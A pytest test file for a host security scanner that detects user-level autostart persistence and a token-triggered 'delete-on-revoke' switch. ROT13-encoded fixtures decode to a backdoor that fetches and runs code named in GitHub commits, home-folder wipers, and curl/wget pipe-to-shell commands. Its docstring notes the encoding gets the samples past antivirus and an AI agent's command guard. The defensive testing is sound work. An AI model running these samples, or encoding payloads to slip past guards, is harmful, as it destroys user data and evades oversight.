"""host.user-autostart / host.revoke-switch: testmetest/Miasma persistence and its delete-on-revoke monitor.

The hostile scripts are stored ROT13-encoded and decoded at test time (see test_skillscan.py): as plain text,
antivirus quarantines test files that contain them, and the agent's command guard stalls on them.
"""
import codecs
import json
import plistlib
import textwrap
from pathlib import Path

import pytest

from asca import autostart, cli, respond
from asca.model import Finding, Severity

SAMPLES = {
    "watchdog": '#!/hfe/ova/rai onfu\nTVGUHO_GBXRA=$(png "$UBZR/.pbasvt/arg-urnygu-purpxre/gbxra")\nZNK_GGY=172800\n'
                'PURPX_VAGREINY=45\njuvyr gehr; qb\n    UGGC_FGNGHF=$(phey -f -b /qri/ahyy -j "%{uggc_pbqr}" -U '
                '"Nhgubevmngvba: Ornere ${TVGUHO_GBXRA}" "uggcf://ncv.tvguho.pbz/hfre") || gehr\n    vs [[ '
                '"$UGGC_FGNGHF" =~ ^40[13]$ ]]; gura\n        riny "$UNAQYRE"\n    sv\n    fyrrc $PURPX_VAGREINY\nqbar\n',
    "wipe_handler": "ez -es ~/; ez -es ~/Qbphzragf",
    "backdoor": 'vzcbeg onfr64, wfba, fhocebprff, gvzr, heyyvo.erdhrfg\njuvyr Gehr:\n    e = wfba.ybnq(heyyvo.erdhrfg.'
                'heybcra("uggcf://ncv.tvguho.pbz/frnepu/pbzzvgf?d=znexre"))\n    sbe vgrz va e.trg("vgrzf", []):\n'
                '        hey = onfr64.o64qrpbqr(vgrz["pbzzvg"]["zrffntr"].fcyvg()[-1]).qrpbqr()\n        pbqr = '
                'heyyvo.erdhrfg.heybcra(hey).ernq()\n        fhocebprff.eha(["clguba3", "-p", pbqr])\n    gvzr.fyrrc(3600)\n',
    "py_wiper": 'vzcbeg fuhgvy, bf, heyyvo.erdhrfg\ngel:\n    heyyvo.erdhrfg.heybcra(heyyvo.erdhrfg.Erdhrfg('
                '"uggcf://ncv.tvguho.pbz/hfre", urnqref={"Nhgubevmngvba": "Ornere " + bcra(bf.cngu.rkcnaqhfre('
                '"~/.pnpur/.g")).ernq().fgevc()}))\nrkprcg Rkprcgvba nf r:\n    vs trgngge(r, "pbqr", 0) va (401, '
                '403):\n        fuhgvy.ezgerr(bf.cngu.rkcnaqhfre("~"))\n',
}
TOKEN = "ghp_" + "Zq8xxLp2Wm7Rt4Yv9Kc6Bn1Hd5Fg3Js0Ab12"          # shape only, built here


def s(name):
    return codecs.decode(SAMPLES[name], "rot13")


def s_(encoded):
    """Decode a ROT13-stored sample written inline."""
    return codecs.decode(encoded, "rot13")


@pytest.fixture
def home(tmp_path):
    h = tmp_path / "home" / "alice"
    h.mkdir(parents=True)
    return h


def w(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def unit(home, name, execstart, extra=""):
    return w(home / ".config/systemd/user" / f"{name}.service",
             f"[Unit]\nDescription=x\n[Service]\n{extra}ExecStart={execstart}\nRestart=always\n"
             f"[Install]\nWantedBy=default.target\n")


def agent(home, label, args, env=None):
    p = home / "Library/LaunchAgents" / f"{label}.plist"
    p.parent.mkdir(parents=True, exist_ok=True)
    d = {"Label": label, "ProgramArguments": args, "RunAtLoad": True, "KeepAlive": True}
    if env:
        d["EnvironmentVariables"] = env
    p.write_bytes(plistlib.dumps(d))
    return p


def run(home, tmp_path, user="alice"):
    return autostart.audit(home, st := {}, root=tmp_path / "root", user=user), st


def _got(fs):
    return [(f.rule, f.severity) for f in fs]


def _install_worm(home, linux=True):
    w(home / ".local/share/runtimes/sync.py", s("backdoor"))
    w(home / ".local/bin/net-health-checker.sh", s("watchdog"))
    w(home / ".config/net-health-checker/token", TOKEN + "\n")
    if linux:
        unit(home, "pkg-runtime", "/usr/bin/python3 %h/.local/share/runtimes/sync.py")
        unit(home, "net-health-checker", "/bin/bash %h/.local/bin/net-health-checker.sh",
             extra=f'Environment="HANDLER={s("wipe_handler")}"\n')
    else:
        agent(home, "com.user.pkg-runtime", ["/usr/bin/python3", str(home / ".local/share/runtimes/sync.py")])
        agent(home, "com.user.net-health-checker", ["/bin/bash", str(home / ".local/bin/net-health-checker.sh")],
              env={"HANDLER": s("wipe_handler")})


@pytest.mark.parametrize("linux", [True, False], ids=["systemd", "launchd"])
def test_worm_layout_backdoor_high_and_switch_critical(home, tmp_path, linux):
    _install_worm(home, linux)
    if linux:
        w(tmp_path / "root/var/lib/systemd/linger/alice", "")
    fs, st = run(home, tmp_path)
    assert sorted(_got(fs), key=str) == sorted([("host.revoke-switch", Severity.CRITICAL),
                                                ("host.user-autostart", Severity.HIGH)], key=str)
    sw = next(f for f in fs if f.rule == "host.revoke-switch")
    assert "~/.config/net-health-checker/token" in sw.detail and "sha256:" in sw.detail and TOKEN not in sw.detail
    assert sw.remediation.startswith("Don't revoke or rotate anything yet") and "disable-linger" in sw.remediation
    assert ("after you log out" in sw.detail) is linux
    bd = next(f for f in fs if f.rule == "host.user-autostart")
    assert "calls the GitHub API" in bd.title and "downloads" in bd.title
    assert st["user_autostart_entries"] == 2 and st["revoke_switches"] == 1


def test_python_wiper_with_its_own_check_is_a_switch(home, tmp_path):
    w(home / ".cache/x/mon.py", s("py_wiper"))
    w(home / ".cache/.t", TOKEN)
    unit(home, "mon", "/usr/bin/env python3 %h/.cache/x/mon.py")
    fs, _ = run(home, tmp_path)
    assert _got(fs) == [("host.revoke-switch", Severity.CRITICAL)] and "~/.cache/.t" in fs[0].detail


def test_inline_bash_c_and_direct_shebang_script(home, tmp_path):
    unit(home, "a", s_("/ova/onfu -p 'juvyr gehr; qb phey -f uggcf://rknzcyr.vainyvq/k | fu; fyrrc 60; qbar'"))
    w(home / ".local/bin/b.sh", s_('#!/ova/fu\njtrg -d -B- uggcf://rknzcyr.vainyvq/l | onfu\n'))
    unit(home, "b", "%h/.local/bin/b.sh")
    w(home / ".local/bin/c.sh", "#!/bin/sh\ncurl -s https://example.invalid/status > ~/.cache/s\n")
    unit(home, "c", "%h/.local/bin/c.sh")
    fs, _ = run(home, tmp_path)
    assert sorted((f.subject.split(":")[0], f.severity) for f in fs) == [
        ("a.service", Severity.MEDIUM), ("b.service", Severity.HIGH), ("c.service", Severity.MEDIUM)]
    assert "downloads and runs code" in fs[0].title or "downloads and runs code" in fs[1].title


@pytest.mark.parametrize("cmd", [
    "/usr/bin/bash -c 'for i in $(seq 1 60); do curl -fsS -m 2 http://127.0.0.1:11434/api/version && exit 0; done'",
    "/usr/bin/bash -c 'curl -fsS http://localhost:8000/health | grep -q ok'",
])
def test_loopback_probes_are_not_network(home, tmp_path, cmd):
    unit(home, "probe", cmd)
    assert run(home, tmp_path)[0] == []


def test_remote_call_from_home_script_is_low(home, tmp_path):
    w(home / "bin/wall.sh", "#!/bin/sh\ncurl -s https://www.bing.com/HPImageArchive.aspx -o /tmp/w.jpg\n")
    unit(home, "wall", "%h/bin/wall.sh")
    assert _got(run(home, tmp_path)[0]) == [("host.user-autostart", Severity.LOW)]


def test_same_signals_outside_hidden_folders_is_medium(home, tmp_path):
    w(home / "scripts/sync.py", s("backdoor"))
    agent(home, "com.me.sync", ["/usr/bin/python3", str(home / "scripts/sync.py")])
    assert _got(run(home, tmp_path)[0]) == [("host.user-autostart", Severity.MEDIUM)]


def test_benign_entries(home, tmp_path):
    w(home / ".local/bin/notify.py", "import time\nprint('hello')\n")
    unit(home, "notify", "/usr/bin/python3 %h/.local/bin/notify.py")                      # info only
    unit(home, "syncthing", "/usr/bin/syncthing serve --no-browser")                       # system binary
    agent(home, "com.docker.helper", ["/Applications/Docker.app/Contents/MacOS/com.docker.helper"])
    w(home / ".local/bin/tool", "\x7fELF\x00binary")
    unit(home, "tool", "%h/.local/bin/tool --daemon")                                       # binary, not a script
    unit(home, "pymod", "/usr/bin/python3 -m http.server 8000")                            # module: pystartup
    w(home / ".config/autostart/x.desktop", "[Desktop Entry]\nExec=/usr/bin/flameshot %f\n")
    fs, st = run(home, tmp_path)
    assert _got(fs) == [("host.user-autostart", Severity.INFO)] and st["user_autostart_entries"] == 6


def test_malformed_files_dont_stop_the_audit(home, tmp_path):
    w(home / "Library/LaunchAgents/bad.plist", "<plist><dict><key>")
    w(home / ".local/share/runtimes/sync.py", s("backdoor"))
    unit(home, "pkg-runtime", "/usr/bin/python3 %h/.local/share/runtimes/sync.py")
    assert _got(run(home, tmp_path)[0]) == [("host.user-autostart", Severity.HIGH)]


WIPES = ['ez -es ~/', 'ez -es ~', 'ez -se $UBZR', 'ez -es "${UBZR}"', 'ez -e -s ~/Qbphzragf', "fuhgvy.ezgerr(bf.cngu.rkcnaqhfre('~'))", 'sf.ezFlap(bf.ubzrqve(), {erphefvir: gehr})']           # ROT13
NOT_WIPES = ['ez -es ~/.pnpur/cvc', 'ez -es $UBZR/gzc/ohvyq', 'ez -s ~/k.ybt', 'ez -es /gzc/k']


def test_home_wipe_patterns():
    for t in map(lambda x: codecs.decode(x, "rot13"), WIPES):
        assert autostart.WIPE.search(t), t
    for t in map(lambda x: codecs.decode(x, "rot13"), NOT_WIPES):
        assert not autostart.WIPE.search(t), t


# ---------------------------------------------------------------- remediation guard
def _secret_finding():
    f = Finding(rule="secret.session-history", category="secrets", severity=Severity.HIGH,
                title="GitHub token in a Claude Code transcript", location="/x", subject="gh",
                remediation="Rotate the key now.")
    respond.enrich([f], Path("/nonexistent"))
    return f


def test_guard_prefixes_every_rotate_fix_but_keeps_fingerprints():
    sec = _secret_finding()
    other = Finding(rule="persona.x", category="agent", severity=Severity.HIGH, title="t", location="/y",
                    remediation="Restore the file, then rotate the API keys.")
    plain = Finding(rule="repo.x", category="repo", severity=Severity.LOW, title="t", location="/z",
                    remediation="Delete the file.")
    sw = Finding(rule="host.revoke-switch", category="host", severity=Severity.CRITICAL, title="t",
                 location="/h/.config/systemd/user/net-health-checker.service", remediation=autostart.FIX_ORDER)
    fps = [f.fingerprint for f in (sec, other, plain)]
    assert autostart.guard_remediation([sec, other, plain, sw]) == 2
    assert sec.remediation.startswith("⚠️ A delete-on-revoke switch") and "net-health-checker.service" in sec.remediation
    assert "github.com/settings/tokens" in sec.remediation and other.remediation.startswith("⚠️")
    assert plain.remediation == "Delete the file." and sw.remediation == autostart.FIX_ORDER
    assert [f.fingerprint for f in (sec, other, plain)] == fps
    assert autostart.guard_remediation([sec, sw]) == 0                                # idempotent


def test_no_switch_no_change():
    sec = _secret_finding()
    before = sec.remediation
    assert autostart.guard_remediation([sec]) == 0 and sec.remediation == before


def test_cli_end_to_end_guards_a_leaked_key(tmp_path, monkeypatch):
    home = tmp_path / "home"
    _install_worm(home)
    proj = home / ".claude" / "projects" / "p"
    proj.mkdir(parents=True)
    (proj / "s.jsonl").write_text(json.dumps({"type": "user", "message": {"content": f"my token is {TOKEN}"}}) + "\n",
                                  encoding="utf-8")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    out = tmp_path / "out" / "rep"
    base = ["--no-hermes", "--no-client-configs", "--no-global-git", "--no-stray-instructions", "-o", str(out),
            "--format", "none"]
    assert cli.run(base) == 1
    fs = json.loads(out.with_suffix(".json").read_text(encoding="utf-8"))["findings"]
    rules = {f["rule"] for f in fs}
    assert {"host.revoke-switch", "host.user-autostart"} <= rules
    keys = [f for f in fs if f["category"] == "secrets"]
    assert keys and all(f["remediation"].startswith("⚠️ A delete-on-revoke switch") for f in keys)
    assert cli.run(base + ["--no-user-autostart"]) == 1
    fs = json.loads(out.with_suffix(".json").read_text(encoding="utf-8"))["findings"]
    assert not any(f["remediation"].startswith("⚠️") for f in fs)


def test_dashboard_card_says_remove_switch_first():
    from datetime import datetime, timezone
    from types import SimpleNamespace
    from asca import blastradius
    tag = "sha256:abcd1234"
    sec = {"rule": "secret.session-history", "severity": "high", "title": "GitHub token in a transcript",
           "subject": "gh", "detail": f"ghp_… (len=40, {tag})", "location": "/x"}
    sw = {"rule": "host.revoke-switch", "severity": "critical", "title": "t", "location": "/y"}
    esc = lambda x: str(x)                                                                # noqa: E731
    now = datetime.now(timezone.utc)
    def html(findings):
        return blastradius.render({"audit": SimpleNamespace(findings=findings)}, lambda j, f: f.get("location"), {},
                                  now, {}, esc, lambda t: None)
    assert "Rotate it first" in html([sec]) and "Remove the delete-on-revoke switch first" in html([sec, sw])
